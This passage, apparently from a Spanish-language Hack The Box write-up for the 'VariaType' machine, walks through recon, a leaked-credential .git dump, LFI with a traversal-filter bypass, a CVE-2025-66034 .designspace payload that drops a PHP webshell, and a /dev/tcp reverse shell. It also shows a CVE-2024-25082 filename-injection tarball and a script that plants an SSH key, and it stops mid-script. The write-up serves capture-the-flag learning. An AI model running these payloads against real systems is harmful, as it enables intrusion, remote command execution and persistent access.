+</span></span><span class="line"><span class="cl">  <span class="o">-</span><span class="n">w</span> <span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="no">Discovery</span><span class="o">/</span><span class="no">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mi">110000</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">t</span> <span class="mi">20</span> <span class="o">-</span><span class="n">ic</span> <span class="o">-</span><span class="n">fw</span> <span class="mi">5</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">portal</span>                  <span class="o">[</span><span class="ss">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span> <span class="ss">Size</span><span class="p">:</span> <span class="mi">2494</span><span class="p">,</span> <span class="ss">Words</span><span class="p">:</span> <span class="mi">445</span><span class="p">,</span> <span class="ss">Lines</span><span class="p">:</span> <span class="mi">59</span><span class="p">,</span> <span class="ss">Duration</span><span class="p">:</span> <span class="mi">106</span><span class="n">ms</span><span class="o">]</span></span></span></code></pre></div>
+<p>Encontramos <code>portal.variatype.htb</code>. Agregamos el subdominio al <code>/etc/hosts</code>.</p>
+<h3 id="portal-php--git-expuesto">
+  Portal PHP — .git expuesto
+  <a class="heading-link" href="#portal-php--git-expuesto">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p><img src="/images/posts/variatype/Portal%20Login%20and%20.git%20found.png" alt=""></p>
+<p>El portal PHP tiene expuesto el directorio <code>.git</code>. Usamos GitHacker para clonar el repositorio:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">githacker</span> <span class="o">--</span><span class="n">url</span> <span class="ss">http</span><span class="p">:</span><span class="sr">//</span><span class="n">portal</span><span class="o">.</span><span class="n">variatype</span><span class="o">.</span><span class="n">htb</span> <span class="o">--</span><span class="n">output</span><span class="o">-</span><span class="n">folder</span> <span class="n">content</span><span class="o">/</span><span class="n">git</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2026</span><span class="o">-</span><span class="mo">06</span><span class="o">-</span><span class="mi">19</span> <span class="mi">12</span><span class="p">:</span><span class="mi">54</span><span class="p">:</span><span class="mi">31</span> <span class="no">INFO</span> <span class="no">Exploiting</span> <span class="ss">http</span><span class="p">:</span><span class="sr">//</span><span class="n">portal</span><span class="o">.</span><span class="n">variatype</span><span class="o">.</span><span class="n">htb</span> <span class="n">into</span> <span class="n">content</span><span class="o">/</span><span class="n">git</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2026</span><span class="o">-</span><span class="mo">06</span><span class="o">-</span><span class="mi">19</span> <span class="mi">12</span><span class="p">:</span><span class="mi">54</span><span class="p">:</span><span class="mi">32</span> <span class="no">INFO</span> <span class="no">Downloading</span> <span class="n">basic</span> <span class="n">files</span><span class="o">...</span></span></span></code></pre></div>
+<p>Revisamos el historial de commits:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">git</span> <span class="n">log</span> <span class="o">--</span><span class="n">oneline</span> <span class="o">--</span><span class="n">all</span>
+</span></span><span class="line"><span class="cl"><span class="mi">753</span><span class="n">b5f5</span> <span class="p">(</span><span class="no">HEAD</span> <span class="o">-&gt;</span> <span class="n">master</span><span class="p">)</span> <span class="ss">fix</span><span class="p">:</span> <span class="n">add</span> <span class="n">gitbot</span> <span class="n">user</span> <span class="k">for</span> <span class="n">automated</span> <span class="n">validation</span> <span class="n">pipeline</span>
+</span></span><span class="line"><span class="cl"><span class="mi">5030e79</span> <span class="ss">feat</span><span class="p">:</span> <span class="n">initial</span> <span class="n">portal</span> <span class="n">implementation</span></span></span></code></pre></div>
+<p>El commit mas reciente agrega un usuario. Tambien encontramos un commit huérfano con <code>git fsck</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">git</span> <span class="n">fsck</span> <span class="o">--</span><span class="n">no</span><span class="o">-</span><span class="n">reflog</span> <span class="o">--</span><span class="n">full</span> <span class="o">--</span><span class="n">unreachable</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">commit</span>
+</span></span><span class="line"><span class="cl"><span class="n">unreachable</span> <span class="n">commit</span> <span class="mi">6</span><span class="n">f021da6be7086f2595befaa025a83d1de99478b</span></span></span></code></pre></div>
+<p>Ese commit huérfano resulta ser donde <strong>eliminaron</strong> las credenciales, pero como git nunca olvida, podemos ver el diff:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">git</span> <span class="n">show</span> <span class="mi">6</span><span class="n">f021da6be7086f2595befaa025a83d1de99478b</span>
+</span></span><span class="line"><span class="cl"><span class="n">commit</span> <span class="mi">6</span><span class="n">f021da6be7086f2595befaa025a83d1de99478b</span>
+</span></span><span class="line"><span class="cl"><span class="ss">Author</span><span class="p">:</span> <span class="no">Dev</span> <span class="no">Team</span> <span class="o">&lt;</span><span class="n">dev</span><span class="vi">@variatype</span><span class="o">.</span><span class="n">htb</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="ss">Date</span><span class="p">:</span>   <span class="no">Fri</span> <span class="no">Dec</span> <span class="mi">5</span> <span class="mi">15</span><span class="p">:</span><span class="mi">59</span><span class="p">:</span><span class="mi">48</span> <span class="mi">2025</span> <span class="o">-</span><span class="mo">0500</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="ss">security</span><span class="p">:</span> <span class="n">remove</span> <span class="n">hardcoded</span> <span class="n">credentials</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">diff</span> <span class="o">--</span><span class="n">git</span> <span class="n">a</span><span class="o">/</span><span class="n">auth</span><span class="o">.</span><span class="n">php</span> <span class="n">b</span><span class="o">/</span><span class="n">auth</span><span class="o">.</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl"><span class="n">index</span> <span class="n">b328305</span><span class="o">..</span><span class="mi">615e621</span> <span class="mi">100644</span>
+</span></span><span class="line"><span class="cl"><span class="o">---</span> <span class="n">a</span><span class="o">/</span><span class="n">auth</span><span class="o">.</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl"><span class="o">+++</span> <span class="n">b</span><span class="o">/</span><span class="n">auth</span><span class="o">.</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl"><span class="err">@@</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">5</span> <span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">3</span> <span class="err">@@</span>
+</span></span><span class="line"><span class="cl"><span class="o">-&lt;</span><span class="p">?</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="vg">$USERS</span> <span class="o">=</span> <span class="o">[</span><span class="s1">&#39;gitbot&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;G1tB0t_Acc3ss_2025!&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">-]</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">+</span><span class="vg">$USERS</span> <span class="o">=</span> <span class="o">[]</span><span class="p">;</span></span></span></code></pre></div>
+<p><strong>Usuario</strong>: <code>gitbot</code> — <strong>Password</strong>: <code>G1tB0t_Acc3ss_2025!</code></p>
+<hr>
+<h2 id="explotacion">
+  Explotacion
+  <a class="heading-link" href="#explotacion">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<h3 id="acceso-al-portal-php">
+  Acceso al portal PHP
+  <a class="heading-link" href="#acceso-al-portal-php">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Iniciamos sesion en <code>portal.variatype.htb</code> con las credenciales de <code>gitbot</code>:</p>
+<p><img src="/images/posts/variatype/Dashboard%20Portal.png" alt=""></p>
+<p>Dentro del portal encontramos un listado de archivos procesados y acceso a un <strong>validador de fuentes</strong>:</p>
+<p><img src="/images/posts/variatype/version.png" alt=""></p>
+<p>La etiqueta revela que usa <strong>VariaType Font Validator v2.1</strong>:</p>
+<p><img src="/images/posts/variatype/cves%20Font%20Validator%202.1.png" alt=""></p>
+<h3 id="fuzzing-de-rutas-en-el-portal">
+  Fuzzing de rutas en el portal
+  <a class="heading-link" href="#fuzzing-de-rutas-en-el-portal">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Fuzzeamos directorios y archivos en el portal PHP con la cookie de sesion:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">ffuf</span> <span class="o">-</span><span class="n">c</span> <span class="o">-</span><span class="n">u</span> <span class="s2">&#34;http://portal.variatype.htb/FUZZ&#34;</span> <span class="p">\</span>
+</span></span><span class="line"><span class="cl">  <span class="o">-</span><span class="n">w</span> <span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="no">Discovery</span><span class="o">/</span><span class="no">Web</span><span class="o">-</span><span class="no">Content</span><span class="o">/</span><span class="n">common</span><span class="o">.</span><span class="n">txt</span> <span class="p">\</span>
+</span></span><span class="line"><span class="cl">  <span class="o">-</span><span class="n">e</span> <span class="o">.</span><span class="n">php</span><span class="p">,</span><span class="o">.</span><span class="n">bak</span><span class="p">,</span><span class="o">.</span><span class="n">zip</span> <span class="o">-</span><span class="n">t</span> <span class="mi">100</span> <span class="o">-</span><span class="n">ic</span> <span class="o">-</span><span class="n">r</span> <span class="p">\</span>
+</span></span><span class="line"><span class="cl">  <span class="o">-</span><span class="n">H</span> <span class="s2">&#34;Cookie: PHPSSESID=5d19c5esle1rgr0q5pha6voj8d&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">download</span><span class="o">.</span><span class="n">php</span>            <span class="o">[</span><span class="ss">Status</span><span class="p">:</span> <span class="mi">200</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">view</span><span class="o">.</span><span class="n">php</span>                <span class="o">[</span><span class="ss">Status</span><span class="p">:</span> <span class="mi">200</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">files</span>                   <span class="o">[</span><span class="ss">Status</span><span class="p">:</span> <span class="mi">403</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">auth</span><span class="o">.</span><span class="n">php</span>                <span class="o">[</span><span class="ss">Status</span><span class="p">:</span> <span class="mi">200</span><span class="o">]</span></span></span></code></pre></div>
+<h3 id="lfi-en-downloadphp">
+  LFI en download.php
+  <a class="heading-link" href="#lfi-en-downloadphp">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p><code>download.php</code> permite leer archivos del servidor. Probamos un path traversal:</p>
+<p><img src="/images/posts/variatype/download.png" alt=""></p>
+<p><img src="/images/posts/variatype/download%20trying%20lfi.png" alt=""></p>
+<p>El servidor bloquea <code>../</code> pero el bypass con <code>....//</code> funciona:</p>
+<p><img src="/images/posts/variatype/LFI.png" alt=""></p>
+<p>Leemos <code>/etc/passwd</code> para identificar usuarios del sistema:</p>
+<pre tabindex="0"><code>root:x:0:0:root:/root:/bin/bash
+steve:x:1000:1000:steve,,,:/home/steve:/bin/bash
+</code></pre><p>El usuario <code>steve</code> es el objetivo. Tambien leemos la configuracion de nginx para conocer la estructura de directorios:</p>
+<p><img src="/images/posts/variatype/config%20portal.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nginx" data-lang="nginx"><span class="line"><span class="cl"><span class="k">server</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kn">listen</span> <span class="mi">80</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kn">server_name</span> <span class="s">portal.variatype.htb</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kn">root</span> <span class="s">/var/www/portal.variatype.htb/public</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kn">index</span> <span class="s">index.php</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kn">location</span> <span class="p">~</span> <span class="sr">\.php$</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kn">include</span> <span class="s">snippets/fastcgi-php.conf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kn">fastcgi_pass</span> <span class="s">unix:/run/php/php-fpm.sock</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kn">location</span> <span class="s">/files/</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kn">autoindex</span> <span class="no">off</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>La raiz del portal es <code>/var/www/portal.variatype.htb/public</code>. PHP se ejecuta via PHP-FPM, lo que significa que podemos ejecutar codigo si logramos escribir un <code>.php</code> ahi.</p>
+<h3 id="cve-2025-66034--arbitrary-file-write-en-fonttools">
+  CVE-2025-66034 — Arbitrary File Write en fontTools
+  <a class="heading-link" href="#cve-2025-66034--arbitrary-file-write-en-fonttools">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Ahora que conocemos la arquitectura, atacamos la aplicacion <strong>Flask</strong> en <code>variatype.htb</code>. El endpoint <code>/tools/variable-font-generator/process</code> usa <code>fontTools.varLib</code> para procesar archivos <code>.designspace</code>. Es vulnerable a <strong>CVE-2025-66034</strong> por dos razones:</p>
+<ol>
+<li>El atributo <code>filename</code> en la etiqueta <code>&lt;variable-font&gt;</code> permite rutas absolutas, y <code>os.path.join()</code> descarta el directorio base si el segundo argumento es absoluto, permitiendo <strong>arbitrary file write</strong>.</li>
+<li>La etiqueta <code>&lt;labelname&gt;</code> con secciones CDATA permite inyectar contenido <strong>PHP</strong> dentro del archivo de salida.</li>
+</ol>
+<p>Creamos un <code>.designspace</code> malicioso que combina ambas vulnerabilidades para escribir una webshell PHP en el directorio publico del portal:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#39;1.0&#39; encoding=&#39;UTF-8&#39;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;designspace</span> <span class="na">format=</span><span class="s">&#34;5.0&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;axes&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;axis</span> <span class="na">tag=</span><span class="s">&#34;wght&#34;</span> <span class="na">name=</span><span class="s">&#34;Weight&#34;</span> <span class="na">minimum=</span><span class="s">&#34;100&#34;</span> <span class="na">maximum=</span><span class="s">&#34;900&#34;</span> <span class="na">default=</span><span class="s">&#34;400&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;labelname</span> <span class="na">xml:lang=</span><span class="s">&#34;en&#34;</span><span class="nt">&gt;</span><span class="cp">&lt;![CDATA[
+</span></span></span><span class="line"><span class="cl"><span class="cp">0xdf output: &lt;?php echo shell_exec($_REQUEST[&#34;cmd&#34;]);?&gt;]]]]&gt;&lt;![CDATA[&gt;]]&gt;</span><span class="nt">&lt;/labelname&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;labelname</span> <span class="na">xml:lang=</span><span class="s">&#34;fr&#34;</span><span class="nt">&gt;</span>MEOW2<span class="nt">&lt;/labelname&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/axis&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/axes&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;sources&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;source</span> <span class="na">filename=</span><span class="s">&#34;Master-Regular.ttf&#34;</span> <span class="na">name=</span><span class="s">&#34;Light&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;location&gt;&lt;dimension</span> <span class="na">name=</span><span class="s">&#34;Weight&#34;</span> <span class="na">xvalue=</span><span class="s">&#34;400&#34;</span><span class="nt">/&gt;&lt;/location&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/source&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/sources&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;variable-fonts&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;variable-font</span> <span class="na">name=</span><span class="s">&#34;MaliciousFont&#34;</span> <span class="na">filename=</span><span class="s">&#34;/var/www/portal.variatype.htb/public/pwned.php&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;axis-subsets&gt;&lt;axis-subset</span> <span class="na">name=</span><span class="s">&#34;Weight&#34;</span><span class="nt">/&gt;&lt;/axis-subsets&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/variable-font&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/variable-fonts&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/designspace&gt;</span>
+</span></span></code></pre></div><p>Subimos el <code>.designspace</code> junto con los <code>.ttf</code> al endpoint de Flask. El servidor procesa el XML y escribe el archivo <code>pwned.php</code> en la raiz del portal con la inyeccion PHP incrustada en los metadatos de la fuente. Como PHP ejecuta cualquier etiqueta <code>&lt;?php ... ?&gt;</code> incluso dentro de binario, la webshell funciona:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">curl</span> <span class="s2">&#34;http://portal.variatype.htb/pwned.php?cmd=id&#34;</span> <span class="o">-</span><span class="n">o</span><span class="o">-</span> <span class="o">||</span> <span class="n">xxd</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[...]</span>
+</span></span><span class="line"><span class="cl"><span class="n">uid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[...]</span></span></span></code></pre></div>
+<p><strong>RCE confirmado como <code>www-data</code>.</strong> Entablamos una reverse shell:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="c1"># Listener</span>
+</span></span><span class="line"><span class="cl"><span class="n">penelope</span> <span class="o">-</span><span class="nb">p</span> <span class="mi">4443</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Reverse shell</span>
+</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">curl</span> <span class="s1">&#39;http://portal.variatype.htb/pwned.php?cmd=bash+-c+&#34;sh+-i+&gt;%26+/dev/tcp/10.10.16.29/4443+0&gt;%261&#34;&#39;</span> <span class="o">-</span><span class="n">o</span><span class="o">-</span> <span class="o">||</span> <span class="n">xxd</span></span></span></code></pre></div>
+<p><strong>Acceso como <code>www-data</code></strong>.</p>
+<hr>
+<h2 id="escalada-de-privilegios">
+  Escalada de Privilegios
+  <a class="heading-link" href="#escalada-de-privilegios">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<h3 id="enumeracion-del-sistema">
+  Enumeracion del sistema
+  <a class="heading-link" href="#enumeracion-del-sistema">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Con acceso a la maquina, exploramos directorios sensibles:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="vi">@variatype</span><span class="ss">:~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span> <span class="sr">/opt
+</span></span></span><span class="line"><span class="cl"><span class="sr">drwxr-xr-x  3 root      root      4096 Mar  9 08:29 font-tools
+</span></span></span><span class="line"><span class="cl"><span class="sr">-rwxr-xr--  1 steve     steve     2018 Feb 26 07:50 process_client_submissions.bak</span></span></span></code></pre></div>
+<p>El script <code>process_client_submissions.bak</code> revela un <strong>pipeline de procesamiento de fuentes</strong> que corre como tarea programada (cron) bajo el usuario <code>steve</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="c1"># Variatype Font Processing Pipeline</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Author: Steve Rodriguez &lt;steve@variatype.htb&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> -euo pipefail
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">UPLOAD_DIR</span><span class="o">=</span><span class="s2">&#34;/var/www/portal.variatype.htb/public/files&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">PROCESSED_DIR</span><span class="o">=</span><span class="s2">&#34;/home/steve/processed_fonts&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">QUARANTINE_DIR</span><span class="o">=</span><span class="s2">&#34;/home/steve/quarantine&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">LOG_FILE</span><span class="o">=</span><span class="s2">&#34;/home/steve/logs/font_pipeline.log&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> <span class="s2">&#34;</span><span class="nv">$UPLOAD_DIR</span><span class="s2">&#34;</span> <span class="o">||</span> <span class="o">{</span> log <span class="s2">&#34;ERROR: Failed to enter upload directory&#34;</span><span class="p">;</span> <span class="nb">exit</span> 1<span class="p">;</span> <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">EXTENSIONS</span><span class="o">=(</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;*.ttf&#34;</span> <span class="s2">&#34;*.otf&#34;</span> <span class="s2">&#34;*.woff&#34;</span> <span class="s2">&#34;*.woff2&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;*.zip&#34;</span> <span class="s2">&#34;*.tar&#34;</span> <span class="s2">&#34;*.tar.gz&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;*.sfd&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> ext in <span class="s2">&#34;</span><span class="si">${</span><span class="nv">EXTENSIONS</span><span class="p">[@]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> file in <span class="nv">$ext</span><span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> timeout <span class="m">30</span> /usr/local/src/fontforge/build/bin/fontforge -lang<span class="o">=</span>py -c <span class="s2">&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">import fontforge
+</span></span></span><span class="line"><span class="cl"><span class="s2">font = fontforge.open(&#39;</span><span class="nv">$file</span><span class="s2">&#39;)
+</span></span></span><span class="line"><span class="cl"><span class="s2">font.close()
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">            log <span class="s2">&#34;SUCCESS: Validated </span><span class="nv">$file</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">fi</span>
+</span></span><span class="line"><span class="cl">        mv <span class="s2">&#34;</span><span class="nv">$file</span><span class="s2">&#34;</span> <span class="s2">&#34;</span><span class="nv">$PROCESSED_DIR</span><span class="s2">/&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">done</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span></span></span></code></pre></div>
+<p>El script monitorea <code>/var/www/portal.variatype.htb/public/files/</code> y procesa cada archivo nuevo con <strong>FontForge</strong>. La variable <code>$file</code> se expande directamente dentro del comando Python sin sanitizacion. Si el nombre del archivo contiene caracteres como <code>;</code>, se inyectan en el codigo Python que FontForge ejecuta.</p>
+<p>Verificamos la version de FontForge:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="vi">@variatype</span><span class="ss">:/</span><span class="n">tmp</span><span class="o">/</span><span class="n">privesc</span><span class="err">$</span> <span class="sr">/usr/</span><span class="n">local</span><span class="o">/</span><span class="n">src</span><span class="o">/</span><span class="n">fontforge</span><span class="o">/</span><span class="n">build</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">fontforge</span> <span class="o">--</span><span class="n">version</span>
+</span></span><span class="line"><span class="cl"><span class="ss">Version</span><span class="p">:</span> <span class="mi">20230101</span>
+</span></span><span class="line"><span class="cl"><span class="no">Based</span> <span class="n">on</span> <span class="n">sources</span> <span class="n">from</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mo">07</span> <span class="mi">11</span><span class="p">:</span><span class="mi">44</span> <span class="no">UTC</span><span class="o">-</span><span class="n">D</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">fontforge</span> <span class="mi">20230101</span></span></span></code></pre></div>
+<h3 id="cve-2024-25082--command-injection-via-filename-en-fontforge">
+  CVE-2024-25082 — Command Injection via filename en FontForge
+  <a class="heading-link" href="#cve-2024-25082--command-injection-via-filename-en-fontforge">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>FontForge 20230101 es vulnerable a <strong>CVE-2024-25082</strong>: inyeccion de comandos a traves del nombre de archivo. Creamos un tarball con un nombre malicioso que, al ser expandido en el codigo Python de FontForge, ejecuta comandos arbitrarios:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">tarfile</span><span class="o">,</span> <span class="nn">io</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">malicious_name</span> <span class="o">=</span> <span class="s2">&#34;exploit.ttf;bash /tmp/privesc/s.sh;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">tar</span> <span class="o">=</span> <span class="n">tarfile</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&#34;exploit.tar&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">info</span> <span class="o">=</span> <span class="n">tarfile</span><span class="o">.</span><span class="n">TarInfo</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="n">malicious_name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="o">.</span><span class="n">size</span> <span class="o">=</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="n">tar</span><span class="o">.</span><span class="n">addfile</span><span class="p">(</span><span class="n">info</span><span class="p">,</span> <span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;AAAA&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">tar</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></div><p>El script <code>s.sh</code> agrega nuestra clave SSH a <code>steve</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>mkdir -p ~/.ssh
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGEsTWa2oyF51xPMwnUExR6ZrGeUvj8auBUn1AyOVB7o kali@kali&#34;</span> &gt; ~/.ssh/authorized_keys
+</span></span><span class="line"><span class="cl">chmod <span class="m">700</span> ~/.ssh
